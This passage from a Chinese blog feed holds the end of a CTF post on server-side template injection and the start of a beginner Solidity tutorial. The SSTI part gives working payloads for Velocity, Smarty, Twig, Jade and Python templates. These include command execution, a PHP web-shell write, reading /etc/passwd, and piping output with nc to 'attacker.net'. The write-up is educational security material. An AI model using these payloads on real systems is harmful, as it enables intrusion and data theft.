ex(&quot;id&quot;) &#125;</span><br><span class="line">uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7)</span><br></pre></td></tr></table></figure><h5 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h5><p>Velocity 同样是一款备受欢迎的模板语言。然而它没有默认变量列表和安全问题页面帮助我们构建 payload。</p><p>百度一下：ClassTool：在模板中实现Java的反射，默认参数：$key</p><p>这里有几个可利用的方法和属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$class.inspect(class/object/string)：返回正在审查类或对象的ClassTool实例</span><br><span class="line">$class.type：返回被审查的类</span><br></pre></td></tr></table></figure><p>换句话说，我们可以通过这两个类获得任意对象信息。再利用目标的Runtime.exec()执行任意命令嗯。通过如下模板，我们可以验证这一点：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$class.inspect(<span class="string">&quot;java.lang.Runtime&quot;</span>).type.getRuntime().exec(<span class="string">&quot;sleep 5&quot;</span>).waitFor() <span class="comment">//延迟了5秒</span></span><br></pre></td></tr></table></figure><p>得到 shell 命令输出有点麻烦：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set($str=$class.inspect(<span class="string">&quot;java.lang.String&quot;</span>).type)</span><br><span class="line">#set($chr=$class.inspect(<span class="string">&quot;java.lang.Character&quot;</span>).type)</span><br><span class="line">#set($ex=$class.inspect(<span class="string">&quot;java.lang.Runtime&quot;</span>).type.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [<span class="number">1.</span>.$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br><span class="line"><span class="comment">//输出 tomcat7</span></span><br></pre></td></tr></table></figure><h5 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h5><p>Smarty 是一款 PHP 的模板语言。它使用安全模式来执行不信任的模板。它只运行 PHP 白名单里的函数，因此我们不能直接调用 system()。然而我们可以从模板已有的类中进行任意调用。而文档表示我们可以通过 smarty 来获取许多环境变量（比如当前变量的位置 $SCRIPT_NAME)。后面，我们又发现了 getStreamVariable:</p><p><img src="/image/media/2022/ssti/ssti_2.jpg"></p><p>这个函数能任意读取有读写权限的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///proc/self/loginuid&quot;</span>)&#125;</span><br><span class="line"><span class="number">1000</span></span><br><span class="line">&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="variable">$SCRIPT_NAME</span>)&#125;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SMARTY_DIR&quot;</span>,<span class="string">&#x27;/usr/share/php/Smarty/&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(SMARTY_DIR.<span class="string">&#x27;Smarty.class.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>不仅如此，我们能任意调用静态方法，这当中包括一个可以创建和重写文件的方法public function writeFile($_filepath, $_contents, Smarty $smarty)。通过该方法，我们能轻松在web目录下创建后门。值得注意的是，第三个参数必须为 Smarty 对象，所以我们要想办法得到 Smarty 对象的引用。</p><p>幸运的是，self::clearConfig帮助我们获取对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> function <span class="title function_">clearConfig</span><span class="params">($varname = <span class="literal">null</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Smarty_Internal_Extension_Config::clearConfig($<span class="built_in">this</span>, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，我们就可以创建后门了！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</span><br></pre></td></tr></table></figure><h5 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h5><p>Twig 和 Smarty 类似，不过我们不能用它调用静态方法。幸运的是，它提供了 _self，我们并不需要暴力枚举变量名。虽然 _self 没什么有用的方法，它提供了指向 Twig_Environment 的env 属性。Twig_Environment 其中的 setCache 方法则能改变 Twig 加载 PHP 文件的路径。这样一来，我们就可以通过改变路径实现 RFI了：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">assign</span> openTag = <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; openTag &#125;&#125;</span><span class="language-xml">_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.loadTemplate(<span class="string">&quot;backdoor&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>但是，PHP 默认禁止远程文件包含（关闭 allow_url_include），因此上述 payload 不能生效。进一步探索，我们在 getFilter 里发现了危险函数 call_user_func。通过传递传递参数到该函数中，我们可以调用任意 PHP 函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;filterCallbacks <span class="keyword">as</span> <span class="variable">$callback</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$filter</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$callback</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerUndefinedFilterCallback</span>(<span class="params"><span class="variable">$callable</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;filterCallbacks[] = <span class="variable">$callable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需注册 exec 为 filter 的回调函数，并如此调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% assign openTag = &#x27;&#123;&#123;&#x27; %&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line">//返回结果： uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)</span><br></pre></td></tr></table></figure><h5 id="Twig（沙箱模式）"><a href="#Twig（沙箱模式）" class="headerlink" title="Twig（沙箱模式）"></a>Twig（沙箱模式）</h5><p>Twig 的沙箱模式有额外的限制。它会禁用一部分函数（包括开发者提供的对象），因此我们并不能调用有价值的东西。万幸的是，这部分代码帮助我们突破限制：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">public function checkMethodAllowed($obj, $method)</span></span><br><span class="line"><span class="language-xml">&#123;</span></span><br><span class="line"><span class="language-xml">  if ($obj instanceof Twig_TemplateInterface || $obj instanceof Twig_Markup) &#123;</span></span><br><span class="line"><span class="language-xml">  return true;</span></span><br><span class="line"><span class="language-xml">&#125;</span></span><br></pre></td></tr></table></figure><p>这里，我们可以调用实现 Twig_TemplateInterface 的对象，也就是说我们可以简介使用 _self.，_self.中的 displayBlock 让我们更上一层楼：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayBlock</span>(<span class="params"><span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$context</span>, <span class="keyword">array</span> <span class="variable">$blocks</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$useBlocks</span> =</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$useBlocks</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$blocks</span>[<span class="variable">$name</span>])) &#123;</span><br><span class="line">    <span class="variable">$template</span> = <span class="variable">$blocks</span>[<span class="variable">$name</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$block</span> = <span class="variable">$blocks</span>[<span class="variable">$name</span>][<span class="number">1</span>];</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;blocks[<span class="variable">$name</span>])) &#123;</span><br><span class="line">    <span class="variable">$template</span> = <span class="variable language_">$this</span>-&gt;blocks[<span class="variable">$name</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$block</span> = <span class="variable language_">$this</span>-&gt;blocks[<span class="variable">$name</span>][<span class="number">1</span>];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$template</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="variable">$block</span> = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">null</span> !== <span class="variable">$template</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="variable">$template</span>-&gt;<span class="variable">$block</span>(<span class="variable">$context</span>, <span class="variable">$blocks</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Twig_Error <span class="variable">$e</span>) &#123;</span><br></pre></td></tr></table></figure><p>我们可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$template -&gt;$block($context, $blocks)</span><br></pre></td></tr></table></figure><p>绕过白名单限制。以下的代码会调用 userObject 对象的 vulnerableMethod：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% assign openTag = &#x27;&#123;&#123;&#x27; %&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125;_self.displayBlock(&quot;id&quot;,[],&#123;&quot;id&quot;:[userObject,&quot;vulnerableMethod&quot;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>虽然现在不能获得化境变量，但我们可以利用 _context 属性查找开发者自定义的对象并调用有用的目标。</p><h5 id="Jade"><a href="#Jade" class="headerlink" title="Jade"></a>Jade</h5><p>Jade 是一款 Node.js 模板引擎。<a href="https://link.zhihu.com/?target=http://CodePen.io">http://CodePen.io</a> 则可以接受用户递交该模板。这里，我会展示如何对模板注入进行黑盒测试。</p><p>首先，让我们来确认模板可以执行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">= 7*7</span><br><span class="line">//结果：49</span><br></pre></td></tr></table></figure><p>再来确认 self 对象的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">= root</span><br><span class="line">//结果：[object global]</span><br></pre></td></tr></table></figure><p>我们来列一下对象属性和函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- var x = root</span><br><span class="line">- for(var prop in x)</span><br><span class="line">, #&#123;prop&#125;</span><br><span class="line"></span><br><span class="line">, ArrayBuffer, Int8Array, Uint8Array, Uint8ClampedArray... global, process, GLOBAL, root</span><br></pre></td></tr></table></figure><p>这些可能是可利用的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- var x = root.process</span><br><span class="line">- for(var prop in x)</span><br><span class="line">, #&#123;prop&#125;</span><br><span class="line"></span><br><span class="line">, title, version, moduleLoadList... mainModule, setMaxListeners, emit, once</span><br></pre></td></tr></table></figure><p>绕过保护机制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">- var x = root.process.mainModule</span><br><span class="line">- for(var prop in x)</span><br><span class="line">, #&#123;prop&#125;</span><br><span class="line"> </span><br><span class="line">因为安全原因，CodePen阻止了你的语句</span><br><span class="line">请删除下列关键字后进行尝试</span><br><span class="line">-&gt;process</span><br><span class="line">-&gt;mainModule</span><br><span class="line"></span><br><span class="line">- var x = root.process</span><br><span class="line">- x = x.mainModule</span><br><span class="line">- for(var prop in x)</span><br><span class="line">, #&#123;prop&#125;</span><br><span class="line"> </span><br><span class="line">, id, exports, parent, filename, loaded, children, paths, load, require, _compile</span><br></pre></td></tr></table></figure><p>确定有用的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- var x = root.process</span><br><span class="line">- x = x.mainModule.require</span><br><span class="line"> </span><br><span class="line">- x(&#x27;a&#x27;)</span><br><span class="line">Cannot find module &#x27;a&#x27;</span><br></pre></td></tr></table></figure><p>最终 exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- var x = root.process</span><br><span class="line">- x = x.mainModule.require</span><br><span class="line">- x = x(&#x27;child_process&#x27;)</span><br><span class="line">= x.exec(&#x27;id | nc attacker.net 80&#x27;)</span><br></pre></td></tr></table></figure><h4 id="六、拓展"><a href="#六、拓展" class="headerlink" title="六、拓展"></a>六、拓展</h4><h5 id="1-相关属性"><a href="#1-相关属性" class="headerlink" title="1.相关属性"></a>1.相关属性</h5><p><strong>class</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python中类对象的 __mro__ 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。</span><br><span class="line">__mro__</span><br></pre></td></tr></table></figure><p>python中类对象的 <code>__mro__</code> 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。</p><p><strong>globals</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">保存了函数所有的所有全局变量，在利用中，可以使用__init__获取对象的函数，并通过__globals__获取file、os等模块以进行下一步的利用</span><br><span class="line">__subclasses__()</span><br></pre></td></tr></table></figure><p>python的新式类都保留了它所有的子类的引用，<code>__subclasses__() </code>这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。因为python中的类都是继承object的，所以只要调用object类对象的 <code>__subclasses__() </code>方法就可以获取想要的类的对象。</p><h5 id="2-常见Payload"><a href="#2-常见Payload" class="headerlink" title="2.常见Payload"></a>2.常见Payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27; )</span><br></pre></td></tr></table></figure><h5 id="3-绕过技巧"><a href="#3-绕过技巧" class="headerlink" title="3.绕过技巧"></a>3.绕过技巧</h5><p>字符串拼接</p><p>绕过技巧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&#x27;/etc/passwd&#x27;).read()</span><br><span class="line">request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__base__.__base__.__base__[&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[60]</span><br></pre></td></tr></table></figure><p>使用参数绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;</span><br><span class="line">    &#x27;clas&#x27;: &#x27;__class__&#x27;,</span><br><span class="line">    &#x27;mr&#x27;: &#x27;__mro__&#x27;,</span><br><span class="line">    &#x27;subc&#x27;: &#x27;__subclasses__&#x27;</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;data&quot;: &quot;&#123;&#123;&#x27;&#x27;[request.args.clas][request.args.mr][1][request.args.subc]()&#125;&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, params=params, data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidity8.0-入门</title>
      <link href="/article/2022-11-15-Solidity8.0-%E5%85%A5%E9%97%A8/"/>
      <url>/article/2022-11-15-Solidity8.0-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Solidity8-0-入门"><a href="#Solidity8-0-入门" class="headerlink" title="Solidity8.0-入门"></a>Solidity8.0-入门</h1><h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://wtf.academy/solidity-start/HelloWeb3</span><br><span class="line">https://www.osgeo.cn/solidity/index.html</span><br><span class="line">https://www.bilibili.com/video/BV1oZ4y1B7WS/?spm_id_from=333.337.search-card.all.click&amp;vd_source=c11905ea80357896daa3f5d07f472904</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">开发工具：</span><br><span class="line">https://remix.ethereum.org/</span><br></pre></td></tr></table></figure><h2 id="Solidity简述"><a href="#Solidity简述" class="headerlink" title="Solidity简述"></a>Solidity简述</h2><p>Solidity是以太坊虚拟机（EVM）智能合约的语言。同时solidity是玩链上项目必备的技能：区块链项目大部分是开源的，如果你能读懂代码，就可以规避很多亏钱项目。</p><p>Solidity具有两个特点：</p><ul><li>基于对象：学会之后，能帮你挣钱找对象。</li><li>高级：不会solidity，在币圈显得很low。</li></ul><p>进入remix，我们可以看到最左边的菜单有三个按钮，分别对应文件（写代码的地方），编译（跑代码），部署（部署到链上）。</p><p>我们点新建（Create New File）按钮，就可以创建一个空白的solidity合约。</p><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//注释使用//</span><br><span class="line">// SPDX-License-Identifier: GPL-3.0   //版权声明，注释形式比如MIT，版权开源协议（不写会警告）</span><br><span class="line">pragma solidity &gt;=0.7.0 &lt;0.9.0;//声明合约文件的版本，^表示X.X.X以上的版本都可以编译，不跨越大版本也支持大于小于，不写其他符号就只能使用指定版本</span><br><span class="line">contract HelloWorld&#123;                //声明合约</span><br><span class="line">    string public myString=&quot;whoami&quot;;    //定义变量，关键词为string，可视范围public(公开可视)，定义之后是一个只读的方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编译和发布"><a href="#编译和发布" class="headerlink" title="编译和发布"></a>编译和发布</h3><p>使用在线网站对源代码编辑和修改之后可以编译和部署</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://remix.ethereum.org/</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/Solidity/img/1.png"></p><p>在上一步操作过程中编译成功之后，下面开始部署，每一份智能合约都会经历编译部署环节。</p><p><img src="/image/media/2022/Solidity/img/2.png"></p><p>当最后的按钮是蓝色的表示是一个只读的方法，点击按钮即可得到变量的值。</p><h2 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h2><h3 id="数据位置"><a href="#数据位置" class="headerlink" title="数据位置"></a>数据位置</h3><p>solidity数据存储位置有三类：<code>storage</code>，<code>memory</code>和<code>calldata</code>。不同存储位置的<code>gas</code>成本不同。<code>storage</code>类型的数据存在链上，类似计算机的硬盘，消耗<code>gas</code>多；<code>memory</code>和<code>calldata</code>类型的临时存在内存里，消耗<code>gas</code>少。大致用法：</p><ol><li><code>storage</code>：合约里的状态变量默认都是<code>storage</code>，存储在链上。</li><li><code>memory</code>：函数里的参数和临时变量一般用<code>memory</code>，存储在内存中，不上链。</li><li><code>calldata</code>：和<code>memory</code>类似，存储在内存中，不上链。与<code>memory</code>的不同点在于<code>calldata</code>变量不能修改（<code>immutable</code>），一般用于函数的参数。例子：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123;</span><br><span class="line">    //参数为calldata数组，不能被修改</span><br><span class="line">    // _x[0] = 0 //这样修改会报错</span><br><span class="line">    return(_x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据位置和赋值规则"><a href="#数据位置和赋值规则" class="headerlink" title="数据位置和赋值规则"></a>数据位置和赋值规则</h3><p>在不同存储类型相互赋值时候，有时会产生独立的副本（修改新变量不会影响原变量），有时会产生引用（修改新变量会影响原变量）。规则如下：</p><ul><li><code>storage</code>（合约的状态变量）赋值给本地<code>storage</code>（函数里的）时候，会创建引用，改变新变量会影响原变量。例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uint[] x = [1,2,3]; // 状态变量：数组 x</span><br><span class="line"></span><br><span class="line">function fStorage() public&#123;</span><br><span class="line">    //声明一个storage的变量 xStorage，指向x。修改xStorage也会影响x</span><br><span class="line">    uint[] storage xStorage = x;</span><br><span class="line">    xStorage[0] = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>storage</code>赋值给<code>memory</code>，会创建独立的复本，修改其中一个不会影响另一个；反之亦然。例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uint[] x = [1,2,3]; // 状态变量：数组 x</span><br><span class="line"></span><br><span class="line">function fMemory() public view&#123;</span><br><span class="line">    //声明一个Memory的变量xMemory，复制x。修改xMemory不会影响x</span><br><span class="line">    uint[] memory xMemory = x;</span><br><span class="line">    xMemory[0] = 100;</span><br><span class="line">    xMemory[1] = 200;</span><br><span class="line">    uint[] memory xMemory2 = x;</span><br><span class="line">    xMemory2[0] = 300;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>memory</code>赋值给<code>memory</code>，会创建引用，改变新变量会影响原变量。</p></li><li><p>其他情况，变量赋值给<code>storage</code>，会创建独立的复本，修改其中一个不会影响另一个。</p></li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p><code>Solidity</code>中变量按作用域划分有三种，分别是状态变量（state variable），局部变量（local variable）和全局变量(global variable)</p><h4 id="状态变量"><a href="#状态变量" class="headerlink" title="状态变量"></a>状态变量</h4><p>状态变量是数据存储在链上的变量，所有合约内函数都可以访问 ，gas消耗高，状态变量在合约内、函数外声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line">contract Variables &#123;</span><br><span class="line">    uint public state1;//定义变量</span><br><span class="line">    uint public state2=123;//初始化，给予初始值</span><br><span class="line">    //如果不写修改方法，myuint2将会一直是123，任何时候去读取都是固定值</span><br><span class="line">    //定义一个函数,external外部可见</span><br><span class="line">    function foo() external&#123;</span><br><span class="line">        //在函数中定义的变量只有在调用这个函数的时候才会在虚拟机中产生</span><br><span class="line">        //在函数内部的变量叫局部变量</span><br><span class="line">        uint notstate = 456;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要不写修改的方法则会永远保存在链上。（类似C全局变量）</p><h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><p>局部变量是仅在函数执行过程中有效的变量，函数退出后，变量无效。局部变量的数据存储在内存里，不上链，gas低。局部变量在函数内声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line">contract Variables &#123;</span><br><span class="line">    uint public state1;//定义变量</span><br><span class="line">    uint public state2=123;//初始化，给予初始值</span><br><span class="line">    address public addr;</span><br><span class="line">    //如果不写修改方法，myuint2将会一直是123，任何时候去读取都是固定值</span><br><span class="line">    //定义一个函数,external外部可见</span><br><span class="line">    function foo() external &#123;</span><br><span class="line">        